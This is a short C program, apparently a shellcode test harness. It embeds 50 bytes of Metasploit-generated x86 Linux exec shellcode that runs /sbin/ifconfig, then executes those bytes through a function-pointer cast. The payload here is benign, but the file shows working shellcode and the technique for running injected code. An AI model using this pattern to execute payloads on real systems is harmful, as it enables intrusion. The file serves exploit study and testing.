#include<stdio.h>
#include<string.h>

/*
 * linux/x86/exec - 50 bytes
 * http://www.metasploit.com
 * VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
 * PrependSetreuid=false, PrependSetuid=false, 
 * PrependSetresgid=false, PrependSetregid=false, 
 * PrependSetgid=false, PrependChrootBreak=false, 
 * AppendExit=false, CMD=/sbin/ifconfig
 */
unsigned char code[] = 
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0f\x00\x00\x00\x2f"
"\x73\x62\x69\x6e\x2f\x69\x66\x63\x6f\x6e\x66\x69\x67\x00\x57"
"\x53\x89\xe1\xcd\x80";

main()
{
    printf("Shellcode Length: %d\n", sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}
